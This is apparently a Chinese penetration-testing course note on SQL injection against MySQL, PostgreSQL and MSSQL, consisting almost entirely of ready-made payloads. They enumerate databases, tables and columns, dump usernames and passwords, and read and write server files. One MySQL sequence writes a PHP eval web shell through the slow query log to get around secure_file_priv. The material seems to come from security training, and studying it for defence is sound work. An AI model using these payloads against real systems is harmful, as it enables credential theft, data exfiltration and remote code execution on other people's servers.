# WEB攻防-通用漏洞&SQL读写注入&MYSQL&MSSQL&PostgreSQL

![day25](/Users/yangluchao/Documents/GitHub/security/image/day25.png)

```
#知识点：
1、SQL注入-MYSQL数据库
2、SQL注入-MSSQL数据库
3、SQL注入-PostgreSQL数据库

#详细点：
Access无高权限注入点-只能猜解，还是暴力猜解
MYSQL，PostgreSQL，MSSQL高权限注入点-可升级读写执行等

```

演示案例：

-   MYSQL-root高权限读写注入
-   PostgreSQL-高权限读写注入
-   MSSQL-sa高权限读写执行注入
-   结尾彩蛋-某Q牌违法登陆框注入

```
#MYSQL-root高权限读写注入
-读取文件：
UNION SELECT 1,load_file('d:/w.txt'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
-写入文件：
UNION SELECT 1,'xxxx',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile 'd:/www.txt'
-路径获取：phpinfo,报错,字典等
-无法写入：secure_file_priv突破 注入中需要支持SQL执行环境，没有就需要借助phpmyadmin或能够直接连上对方数据库进行绕过
set global slow_query_log=1;
set global slow_query_log_file='shell路径';
select '<?php eval($_GET[A])?>' or SLEEP(1);

#PostgreSQL-高权限读写注入
-测列数：
order by 4
and 1=2 union select null,null,null,null
-测显位：第2，3
and 1=2 union select 'null',null,null,null 错误
and 1=2 union select null,'null',null,null 正常
and 1=2 union select null,null,'null',null 正常
and 1=2 union select null,null,null,'null' 错误
-获取信息：
and 1=2 UNION SELECT null,version(),null,null
and 1=2 UNION SELECT null,current_user,null,null
and 1=2 union select null,current_database(),null,null
-获取数据库名：
and 1=2 union select null,string_agg(datname,','),null,null from pg_database
-获取表名：
1、and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public'
2、and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables
-获取列名：
and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users'
-获取数据：
and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users
-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：
and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE
参考：https://www.freebuf.com/sectool/249371.html

#MSSQL-sa高权限读写执行注入
-测列数：
order by 4
and 1=2 union all select null,null,null,null
-测显位：
and 1=2 union all select null,1,null,null
and 1=2 union all select null,null,'s',null
-获取信息：
@@version 获取版本信息
db_name() 当前数据库名字
user、system_user,current_user,user_name 获取当前用户名
@@SERVERNAME 获取服务器主机信息
and 1=2 union all select null,db_name(),null,null
-获取表名：
and 1=2  union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,null
union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null
-获取列名：
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null
-获取数据：
and 1=2 union all select null,username, password ,null from manage

```

